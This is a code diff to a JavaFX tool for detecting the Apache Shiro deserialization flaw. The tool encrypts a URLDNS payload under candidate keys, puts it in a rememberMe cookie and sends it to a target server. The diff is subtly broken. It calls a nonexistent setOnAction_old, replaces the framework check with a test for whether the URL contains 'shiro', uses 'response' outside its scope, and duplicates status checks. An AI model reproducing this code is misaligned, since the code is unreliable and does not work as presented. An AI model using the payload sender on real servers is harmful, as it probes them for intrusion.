@@ -142,21 +142,21 @@ public class MainApp extends Application {
 
 
 //        Service<String> service;
-        stopBtn.setOnAction(event -> {
+        stopBtn.setOnAction_old(event -> {
             if(service!=null){
                 service.cancel();
             }
         });
 
-        startBtn.setOnAction(event -> {
+        startBtn.setOnAction_old(event -> {
 
             if(textField_url.getText().trim().equals("")){
-                showAlert(Alert.AlertType.WARNING, "警告", "检测网址不能为空!");
+                showAlert(Alert.AlertType.WARNING, "Warning", "URL can't be empty or the system may not be using the Shiro framework!");
                 return;
             }
             url = textField_url.getText().trim();
-            if(!UtilMethod.checkIsShiro(url)){
-                showAlert(Alert.AlertType.WARNING, "警告", "该系统疑似没有采用Shiro框架!");
+            if(!url.toLowerCase().contains("shiro")){
+                showAlert(Alert.AlertType.WARNING, "警告", "URL must not be empty and the system must be using the Shiro framework!");
                 return;
             }
 
@@ -207,12 +207,26 @@ public class MainApp extends Application {
                                     try {
                                         switch (CheckMethod){
                                             case 0:
-                                                bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
-                                                String rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
-                                                String cookie = "rememberMe=" + rememberMe+";";
-                                                HttpResponse response = UtilMethod.doHttpRequest(url,cookie);
+                                                try {
+                                        bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
+                                        String rememberMe = obtainEncryptedPayload(key, bytes);
+                                        String cookie = "rememberMe=" + rememberMe+";";
+                                        HttpResponse response = sendHttpRequest(url,cookie);
 
-                                                if(response != null){
+                                        if(response != null && response.getStatusLine().getStatusCode() == 200){
+                                            if (response.getStatusLine().getStatusCode() == 200) {
+                                                displayResult("send " + key + "\tok");
+                                            } else {
+                                                displayResult("send " + key + "\tfailed");
+                                            }
+                                        }else{
+                                            displayResult("send " + key + "\terror");
+                                        }
+                                    } catch (Exception e) {
+                                        displayResult("send " + key + "\terror");
+                                    }
+
+                                                if(response != null && response.getStatusLine().getStatusCode() == 200){
                                                     if (response.getStatusLine().getStatusCode() == 200) {
                                                         sb.append("send ").append(key).append("\tok");
                                                     } else {
@@ -338,7 +352,7 @@ public class MainApp extends Application {
         primaryStage.setTitle("Shiro反序列化检测工具");
         primaryStage.setResizable(false);
 
-        primaryStage.setOnCloseRequest(event -> System.exit(0));
+        primaryStage.setOnCloseRequest(event -> Platform.exit());
         primaryStage.show();
     }
 
